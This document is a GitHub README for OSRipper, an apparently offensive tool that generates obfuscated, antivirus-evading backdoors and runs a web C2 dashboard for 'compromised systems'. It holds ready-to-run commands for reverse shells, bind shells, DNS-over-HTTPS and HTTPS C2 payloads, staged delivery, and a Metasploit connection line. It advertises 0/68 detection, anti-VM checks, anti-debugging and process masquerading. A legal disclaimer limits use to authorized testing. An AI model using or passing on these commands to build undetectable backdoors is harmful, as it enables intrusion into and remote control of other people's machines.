# OSRipper v0.3.2

<div align="center">

![OSRipper Logo](img/OSRipper.png)

[![CodeFactor](https://www.codefactor.io/repository/github/noahoksuz/osripper/badge)](https://www.codefactor.io/repository/github/subglitch1/osripper/)
[![Python Version](https://img.shields.io/badge/python-3.6%2B-blue.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux-lightgrey.svg)]()

**Advanced cross-platform payload generator and crypter with FUD capabilities**

[Features](#features) • [Quick Start](#quick-start) • [Web UI](#web-ui) • [Payload Types](#payload-types) • [Documentation](#documentation)

</div>

---

## Overview

OSRipper is a sophisticated, fully undetectable (FUD) backdoor generator and crypter designed for authorized penetration testing and red team operations. It features advanced evasion techniques, multiple payload types, and a modern web-based C2 interface for managing compromised systems.

### Key Highlights

- **Fully Undetectable (FUD)** - Advanced evasion techniques bypass modern AV solutions
- **Web-Based C2 Interface** - Modern dashboard for managing active sessions
- **Multiple Payload Types** - Bind shells, reverse shells, DoH C2, HTTPS C2, and more
- **Multi-Layer Obfuscation** - Standard and enhanced obfuscation with randomized variables
- **Binary Compilation** - Compile payloads to standalone executables
- **Encrypted Communications** - SSL/TLS and certificate-pinned HTTPS C2 channels
- **Stealth Features** - VM detection, anti-debugging, process masquerading

---

## Features

### Payload Generation

| Payload Type | Description | Use Case |
|-------------|-------------|----------|
| **Bind Shell** | Opens port on victim machine | Direct access when reverse connections blocked |
| **Reverse TCP Meterpreter** | SSL/TLS encrypted reverse connection | Standard penetration testing |
| **DNS-over-HTTPS C2** | Stealthy DoH-based command & control | Bypass network restrictions |
| **HTTPS C2** | Certificate-pinned HTTPS C2 | Secure, authenticated C2 channel |
| **Staged Payload** | Multi-stage web delivery | Enhanced stealth deployment |
| **Custom Code Crypter** | Obfuscate any Python script | Custom payload encryption |

### Evasion Techniques

- **Advanced Obfuscation** - Multi-layer code encoding with random variables
- **Enhanced Obfuscation** - Anti-debug, VM detection, junk code injection
- **Anti-VM Detection** - Sandbox and virtual machine evasion
- **Stealth Delays** - Random startup delays (5-15 seconds)
- **Process Masquerading** - Disguise as legitimate system processes
- **Signature Randomization** - Every payload is unique

### Web UI Features

- **Session Dashboard** - View all active C2 sessions
- **Interactive Terminal** - Execute commands via web interface
- **Payload Generator** - Generate payloads directly from web UI
- **Session Management** - View system info, command history, and manage sessions
- **Real-time Updates** - Live command execution and response viewing

### Advanced Capabilities

- **Ngrok Integration** - Automatic tunnel creation for dynamic IPs
- **Certificate Pinning** - Secure HTTPS C2 with certificate validation
- **Session Persistence** - Maintain connections across restarts
- **Command Queueing** - Queue commands for offline agents
- **Response Parsing** - Automatic parsing of command output

---

## Quick Start

### Installation

```bash
# Clone repository
git clone https://github.com/SubGlitch1/OSRipper.git
cd OSRipper

# Install dependencies
pip3 install -r requirements.txt

# Install package
pip3 install -e .
```

### Basic Usage

**Interactive Mode:**
```bash
osripper
# or
python3 -m osripper
```

**Command Line:**
```bash
# Generate reverse shell
osripper-cli reverse -H 192.168.1.100 -p 4444 --obfuscate --compile

# Generate DoH C2 payload
osripper-cli doh -d example.com --obfuscate --compile
```

**Web UI:**
```bash
# Start C2 server with web UI
python -m osripper.c2.server example.com --port 5000

# Access dashboard at http://localhost:5000
```

---

## Web UI

OSRipper includes a modern web-based C2 interface for managing compromised systems.

### Features

- **Dashboard** - Overview of all active sessions
- **Session Management** - View system information and execute commands
- **Payload Generator** - Generate DoH and HTTPS payloads via web interface
- **Command History** - Track all executed commands and responses
- **Real-time Updates** - Live command execution and response viewing

### Starting the C2 Server

```bash
# Basic usage
python -m osripper.c2.server example.com

# With HTTPS
python -m osripper.c2.server example.com --https

# Custom port
python -m osripper.c2.server example.com --port 8080

# With custom certificate
python -m osripper.c2.server example.com --https --cert server.crt --key server.key
```

### Accessing the Web UI

Once the server is running, access the dashboard at:
- **HTTP**: `http://localhost:5000`
- **HTTPS**: `https://localhost:5000` (if enabled)

---

## Payload Types

### 1. Bind Shell Backdoor

Opens a port on the victim machine and waits for connections.

```bash
osripper-cli bind -p 4444 --obfuscate --compile
```

**Connection:**
```bash
msfconsole -q -x 'use python/meterpreter/bind_tcp; set RHOST target_ip; set RPORT 4444; exploit'
```

### 2. Reverse TCP Meterpreter

Encrypted reverse connection with SSL/TLS.

```bash
osripper-cli reverse -H 192.168.1.100 -p 4444 --obfuscate --enhanced --compile
```

### 3. DNS-over-HTTPS C2

Stealthy C2 channel using DNS-over-HTTPS protocol. Bypasses many network restrictions.

```bash
# Generate payload
osripper-cli doh -d example.com --obfuscate --compile

# Start C2 server
python -m osripper.c2.server example.com
```

**Features:**
- Stealthy DNS-based communication
- Web UI for session management
- Automatic session persistence
- Command queueing for offline agents

### 4. HTTPS C2 (Certificate Pinning)

Secure HTTPS C2 with certificate pinning for authentication.

```bash
# Generate payload (via web UI or CLI)
# Start C2 server with HTTPS
python -m osripper.c2.server example.com --https

# Get certificate fingerprint
curl http://localhost:5000/api/cert-fingerprint
```

**Features:**
- Certificate pinning for security
- Encrypted HTTPS communication
- Web UI integration
- Session management

### 5. Staged Payload

Multi-stage web delivery for enhanced stealth.

```bash
osripper-cli staged -H 192.168.1.100 -p 8080 --obfuscate
```

### 6. Custom Code Crypter

Obfuscate and encrypt any Python script.

```bash
osripper-cli custom --script mypayload.py --obfuscate --enhanced --compile
```

---

## Command Line Interface

### Common Options

| Option | Description |
|-------|-------------|
| `--obfuscate` | Enable multi-layer obfuscation |
| `--enhanced` | Enhanced obfuscation (anti-debug, VM detection) |
| `--compile` | Compile to standalone binary |
| `--icon PATH` | Custom icon for compiled binary |
| `--delay` | Add random startup delay (5-15 seconds) |
| `--output, -o NAME` | Output filename |
| `--quiet, -q` | Quiet mode (minimal output) |

### Examples

```bash
# Full-featured reverse shell
osripper-cli reverse -H 192.168.1.100 -p 4444 \
  --obfuscate --enhanced --compile --icon app.ico --delay

# DoH C2 with all features
osripper-cli doh -d example.com \
  --obfuscate --enhanced --compile --delay

# Custom script encryption
osripper-cli custom --script malware.py \
  --obfuscate --enhanced --compile

# Using ngrok for dynamic IP
osripper-cli reverse --ngrok -p 4444 --obfuscate --compile
```

---

## Detection Results

### Latest VirusTotal Scans

- **Python Payload**: [0/68 Detection Rate](https://www.virustotal.com/gui/file/e7e654893cec4e1f1aa76e2bbfa4bb1e0c6a15adf19236845948877e93013aea)
- **Compiled Binary**: [0/68 Detection Rate](https://www.virustotal.com/gui/file-analysis/MjM2MTJiMjI3YTMzM2JjYzExMTJhMzhiMGY4ODQxZjA6MTcwMTcyOTE3MQ==)

### antiscan result
![Antiscan Results](img/example.png)

---

## Architecture

```
┌─────────────────┐
│   Generated     │
│    Binary       │
└─────────────────┘
         │
         │ Execute
         ▼
┌──────────────────┐
│ Obfuscated       │
│ Dropper          │
└──────────────────┘
         │
         │ HTTP/HTTPS/DoH
         ▼
┌─────────────────┐
│                 │
│   C2 SERVER     │
│   (Web UI)      │
│                 │
└─────────────────┘
         │
         │ Command/Response
         ▼
┌─────────────────┐
│   Agent         │
│   Execution     │
└─────────────────┘
```

---

## Screenshots

### Main Interface

### Web UI Dashboard
![Web UI Dashboard](img/dashboard.png)


---

## Advanced Configuration

### Ngrok Integration

```bash
# Generate payload with ngrok
osripper-cli reverse --ngrok -p 4444

# Follow prompts to set up tunnel
# Run: ngrok tcp 4444
```

### Custom Icons

```bash
osripper-cli reverse -H 192.168.1.100 -p 4444 \
  --compile --icon /path/to/icon.ico
```

### Obfuscation Levels

**Standard Obfuscation:**
- Multi-layer encoding
- Variable randomization
- Code structure obfuscation

**Enhanced Obfuscation:**
- All standard features
- Anti-debugging techniques
- VM detection
- Junk code injection
- Advanced evasion

```bash
# Standard
osripper-cli reverse -H 192.168.1.100 -p 4444 --obfuscate

# Enhanced
osripper-cli reverse -H 192.168.1.100 -p 4444 --obfuscate --enhanced
```

### HTTPS C2 Setup

```bash
# 1. Start C2 server with HTTPS
python -m osripper.c2.server example.com --https

# 2. Get certificate fingerprint
curl http://localhost:5000/api/cert-fingerprint

# 3. Generate payload with fingerprint (via web UI)
# Or use the fingerprint in your payload generation
```

---

## Documentation

- **[Wiki](https://github.com/SubGlitch1/OSRipper/wiki)** - Comprehensive documentation
- **[Usage Guide](docs/USAGE.md)** - Detailed usage instructions
- **[API Reference](docs/API.md)** - Developer documentation

---

## Roadmap

### Completed (v0.3.2)
- [x] FUD payload generation (0/68 detection)
- [x] Web-based C2 interface
- [x] DNS-over-HTTPS C2 payload
- [x] HTTPS C2 with certificate pinning
- [x] Multi-layer obfuscation engine
- [x] Session management system
- [x] Command queueing and execution
- [x] Anti-VM detection
- [x] Process masquerading

### In Progress
- [ ] Enhanced post-exploitation modules
- [ ] Advanced persistence mechanisms
- [ ] File upload/download via web UI
- [ ] Multi-user support for C2 server

### Future Plans
- [ ] AI-powered evasion techniques
- [ ] Blockchain-based C2 infrastructure
- [ ] Mobile platform support
- [ ] Advanced social engineering payloads

---

## Contributing

We welcome contributions from the security research community!

### How to Contribute

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

### Development Guidelines

- Follow PEP 8 coding standards
- Add docstrings to all functions
- Test on multiple platforms
- Ensure FUD capabilities remain intact

---

## Acknowledgments

Special thanks to the security research community and these projects:

- [htr-tech/PyObfuscate](https://github.com/htr-tech/PyObfuscate) - Obfuscation inspiration
- [cedowens/SwiftBelt](https://github.com/cedowens/SwiftBelt) - macOS enumeration
- [Metasploit Framework](https://github.com/rapid7/metasploit-framework) - Payload handling

---

## Legal Disclaimer

**IMPORTANT**: This tool is developed for educational purposes and authorized penetration testing only.

- **Authorized Use**: Security research, penetration testing, red team exercises
- **Prohibited Use**: Unauthorized access, malicious activities, illegal purposes

**The developers are not responsible for misuse of this software. Users must comply with all applicable laws and regulations.**

---

## Support

- **Bug Reports**: [Open an Issue](https://github.com/SubGlitch1/OSRipper/issues)
- **Feature Requests**: [Discussions](https://github.com/SubGlitch1/OSRipper/discussions)
- **Security Issues**: Contact maintainers privately

